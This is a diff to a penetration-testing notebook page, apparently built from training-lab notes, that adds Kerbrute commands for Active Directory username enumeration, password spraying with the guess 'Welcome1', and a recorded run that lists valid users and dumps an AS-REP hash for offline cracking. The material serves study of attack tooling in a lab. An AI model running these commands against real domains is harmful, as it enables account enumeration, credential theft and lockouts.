@@ -9,6 +9,96 @@ hideFooterPagination: true
 
 {/* Generated from Commands/kerbrute.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Kerbrute: choose the operation and read the result
+
+Use the saved Kerberos username and authentication checks.
+
+### What the result establishes
+
+Distinguish a username-validity response from a successful password authentication result.
+
+### Prerequisites and common failures
+
+Username enumeration and password guessing are different modes; account lockout behavior and the selected realm/DC must be understood before credential attempts.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+kerbrute userenum -d DOMAIN --dc DC_IP users.txt
+```
+
+### Example 2: Kerbrute — Startup and User Enumeration
+
+Run in: **Saved lab example**.
+
+```bash
+./kerbrute --help
+./kerbrute userenum --help
+```
+
+Saved context: [Kerbrute — Startup and User Enumeration — Kerbrute — Startup and User Enumeration](/tools/kerbrute). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: using ldap search
+
+Run in: **Saved lab example**.
+
+```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt
+```
+
+Saved context: [AD Password Policies and User Lists — using ldap search](/active-directory/password-policy-user-lists#using-ldap-search). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Internal password spraying from linux
+
+Run in: **Saved lab example**.
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+Saved context: [Active Directory Password Spraying — Internal password spraying from linux](/active-directory/password-spraying#internal-password-spraying-from-linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Retrieving the AS-REP Using Kerbrute
+
+Run in: **Saved lab example**.
+
+```shellsession
+grcic550@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
+
+2022/04/01 13:14:17 >  Using KDC(s):
+2022/04/01 13:14:17 >   172.16.5.5:88
+
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   sbrown@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   jjones@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   tjohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   jwilson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   bdavis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   njohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   asanchez@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   dlewis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:   ccruz@inlanefreight.local
+2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
+
+<SNIP>
+```
+
+Saved context: [Miscellaneous Misconfigurations — Retrieving the AS-REP Using Kerbrute](/active-directory/miscellaneous-misconfigurations#retrieving-the-as-rep-using-kerbrute). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Use the saved Kerberos username and authentication checks.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=kerbrute) · [All tools](/index)
@@ -20,6 +110,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 kerbrute userenum -d DOMAIN --dc DC_IP users.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerbrute — Startup and User Enumeration — Example 1: Commands](/tools/kerbrute#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -39,6 +136,13 @@ kerbrute userenum -d DOMAIN --dc DC_IP users.txt
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Password Policies and User Lists — using ldap search](/active-directory/password-policy-user-lists#using-ldap-search) · [Kerbrute — Startup and User Enumeration — Example 3: using ldap search](/tools/kerbrute#example-3-using-ldap-search)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Internal password spraying from linux">
@@ -50,6 +154,13 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt
 ```bash
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Password Spraying — Internal password spraying from linux](/active-directory/password-spraying#internal-password-spraying-from-linux) · [Kerbrute — Startup and User Enumeration — Example 4: Internal password spraying from linux](/tools/kerbrute#example-4-internal-password-spraying-from-linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -135,6 +246,13 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:e4546b6938e4d52567482d2ee39ff9a4$ff282
 2026/07/21 08:49:35 >  Done! Tested 48705 usernames (56 valid) in 17.512 seconds
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Initial Active Directory Enumeration — Identifying Users](/active-directory/initial-enumeration#identifying-users)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Kerbrute — Startup and User Enumeration">
@@ -147,6 +265,13 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:e4546b6938e4d52567482d2ee39ff9a4$ff282
 ./kerbrute --help
 ./kerbrute userenum --help
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerbrute — Startup and User Enumeration — Example 2: Kerbrute — Startup and User Enumeration](/tools/kerbrute#example-2-kerbrute-—-startup-and-user-enumeration) · [Kerbrute — Startup and User Enumeration — Existing notes and worked examples](/tools/kerbrute#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -185,6 +310,13 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698e
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerbrute — Startup and User Enumeration — Example 5: Retrieving the AS-REP Using Kerbrute](/tools/kerbrute#example-5-retrieving-the-as-rep-using-kerbrute) · [Miscellaneous Misconfigurations — Retrieving the AS-REP Using Kerbrute](/active-directory/miscellaneous-misconfigurations#retrieving-the-as-rep-using-kerbrute)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="AS-REP Roasting: Quick Reference">
@@ -199,6 +331,21 @@ Context from the notebook: Combine with username enumeration ( kerbrute userenum
 kerbrute userenum
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AS-REP Roasting: Quick Reference — Existing notes and worked examples](/active-directory/asrep-roasting#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Kerbrute — Startup and User Enumeration](/tools/kerbrute)
+
+{/* VAULT_RELATED_END */}
